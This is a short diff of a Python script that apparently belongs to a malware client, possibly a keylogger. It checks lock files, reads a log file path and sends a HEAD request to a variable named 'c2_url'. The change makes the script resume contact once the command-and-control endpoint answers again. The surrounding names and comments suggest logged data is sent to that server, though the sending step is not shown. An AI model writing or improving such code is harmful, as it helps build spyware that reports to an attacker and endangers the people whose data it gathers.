@@ -19,15 +19,17 @@ if __name__ == "__main__":
 	if(os.name == 'nt'):
 		logpath = pathlib.WindowsPath(logfile)
 		if(os.path.exists(WINDOWS_LOCKFILE) == True):
-			blocked = True;
+			blocked = True
 	if(os.name == 'posix'):
 		logpath = pathlib.PosixPath(logfile)
 		if(os.path.exists(LINUX_LOCKFILE) == True):
-			blocked = True;
+			blocked = True
 	##check if enpoint is live after last connection failed
 	if(blocked == True):
 		checked = requests.request('HEAD',
 					   c2_url,)
+		if(checked.status_code == 200):
+			blocked = False
 	if(logpath.is_file() == False):
 		sys.exit()
 	##Creates Headers for endpoint identification
